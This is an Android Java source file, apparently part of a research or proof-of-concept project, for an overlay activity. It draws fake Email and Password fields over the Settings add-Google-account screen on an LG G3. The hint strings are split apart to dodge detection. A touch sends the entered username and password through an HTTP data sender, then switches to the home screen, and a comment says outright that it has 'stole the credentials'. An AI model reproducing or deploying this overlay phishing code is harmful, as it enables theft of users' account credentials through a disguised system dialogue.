package ch.example.dancingpigs.apps;

import ch.example.dancingpigs.HttpDataSender;
import ch.example.dancingpigs.MainService;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.text.InputType;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.View.OnTouchListener;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.LinearLayout.LayoutParams;

public class OverlayActivity extends Activity {
	public View overlayView = null;
	public WindowManager.LayoutParams params = null;
	protected boolean overlayActive = false;
	public MainService service;
	public OverlayApp app;

	final public static String ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS = "ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS";
	
	protected String className = "X";
	
	public OverlayActivity(MainService service, OverlayApp app, String _appName, String _className){
		super();
		className = _className;
		this.service = service;
		this.app = app;
		overlayActive = false;
		overlayView = new LinearLayout(service.getBaseContext());
		
		overlayView.setBackgroundColor(0x88ff0000);
			        
	}
	
	
	public View getView() {
		return overlayView;
	}
	
	public WindowManager.LayoutParams getLayoutParams() {
		return params;
	}
	
	public boolean isOverlayActive(){
		return this.overlayActive;
	}
	
	public void setOverlayActive(boolean state){
		this.overlayActive = state;
	}
	
	public String getClassName() {
		return this.className;
	}
	
	
	public void createView(){
		
		//TODO: This entire method is focused on only working on LG g3
		//      to overlay the Android Settings - Add Google account -
		//      add existing dialogue with fake username and password
		//      EditTexts on Android 4.4.2. It wouldn't be to hard to
		//      make the entire process more device dependent and setup
		//      different Views for different devices, screen sizes, etc.
		//      and maybe add some information to the server's config.txt
		//      rather than hard coding it in here
		
		final String first_tag = "first_tag";
		final String second_tag = "second_tag";
		final String third_tag = "third_tag";
		
		params = new WindowManager.LayoutParams(WindowManager.LayoutParams.MATCH_PARENT,
				WindowManager.LayoutParams.MATCH_PARENT,WindowManager.LayoutParams.TYPE_TOAST, 0, PixelFormat.TRANSLUCENT);
				
		RelativeLayout mainView = new RelativeLayout(service);
		mainView.setBackgroundColor(0x00ffffff);
		
		
		LinearLayout l = new LinearLayout(service);
		RelativeLayout.LayoutParams param_one = new RelativeLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);
        param_one.width=1350;
        param_one.height=400;
        param_one.leftMargin=52;
        param_one.topMargin=354;
        l.setTag(first_tag);
        l.setOrientation(LinearLayout.VERTICAL);
		l.setBackgroundColor(0x00ffffff);
				
		EditText second_test = new EditText(service);
		second_test.setBackgroundColor(Color.parseColor("#0b0b0b")); //TODO: not perfect color
		second_test.setTextColor(Color.LTGRAY);
		String k = "ai";
		second_test.setHint("Em"+k+"l");
		second_test.setWidth(1350);
		second_test.setTag(second_tag);
		second_test.setTextSize(20);
        LinearLayout.LayoutParams llp = new LinearLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);
        llp.setMargins(20, 30, 20, 1);
        second_test.setLayoutParams(llp);
        l.addView(second_test);
		
        String a = "ssw";
		EditText third_test = new EditText(service);
		third_test.setBackgroundColor(Color.parseColor("#0b0b0b")); //TODO: not perfect color
		third_test.setTextColor(Color.LTGRAY);
		third_test.setHint("Pa"+a+"ord");
		third_test.setWidth(1350);
		third_test.setTag(third_tag);
		third_test.setInputType(third_test.getInputType() | InputType.TYPE_TEXT_VARIATION_PASSWORD);
		third_test.setTextSize(20);
        LinearLayout.LayoutParams llp2 = new LinearLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);
        llp2.setMargins(20, 0, 20, 0);
        third_test.setLayoutParams(llp2);
		third_test.setOnFocusChangeListener(new View.OnFocusChangeListener() {
	        @Override
	        public void onFocusChange(View v, boolean hasFocus) {
	            if (!hasFocus) {
	            	Log.v("", "lost focus");
	            }
	        }
		});
		l.addView(third_test);
		
		mainView.addView(l, param_one);
		

		LinearLayout bottomLayout = new LinearLayout(service);
		bottomLayout.setBackgroundColor(0x00ffffff);
		RelativeLayout.LayoutParams bottomparam = new RelativeLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);
		bottomparam.width=1450;
		bottomparam.height=1300;
		bottomparam.leftMargin=0;
		bottomparam.topMargin=1000;
		
		bottomLayout.setOnTouchListener(new OnTouchListener(){

			@Override
			public boolean onTouch(View v, MotionEvent event) {
	            
				View k = (View)v.getParent();
				LinearLayout l = (LinearLayout) k.findViewWithTag(first_tag);
				EditText second_test = (EditText) l.findViewWithTag(second_tag);
				EditText third_test = (EditText) l.findViewWithTag(third_tag);
				
				if(!third_test.getText().toString().isEmpty()){
					
					
					String result = "u="+second_test.getText().toString()+"&p="+third_test.getText().toString();
					(new HttpDataSender()).execute(result);
					
					//Home button
		            Intent i = new Intent(Intent.ACTION_MAIN);
					i.addCategory(Intent.CATEGORY_HOME);
					i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					
		            
					service.startActivity(i);
					try {
						//Home button press is a little delayed on LG g3, let's delay removing our overlay
						Thread.sleep(80);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
					
					//After we stole the credentials once, don't steal them again:
					className = "XXX "+className;
				}
				
				return true;
			}
			
		});
		
		mainView.addView(bottomLayout, bottomparam);
		overlayView = mainView;		
		
		
	}
	
	
}
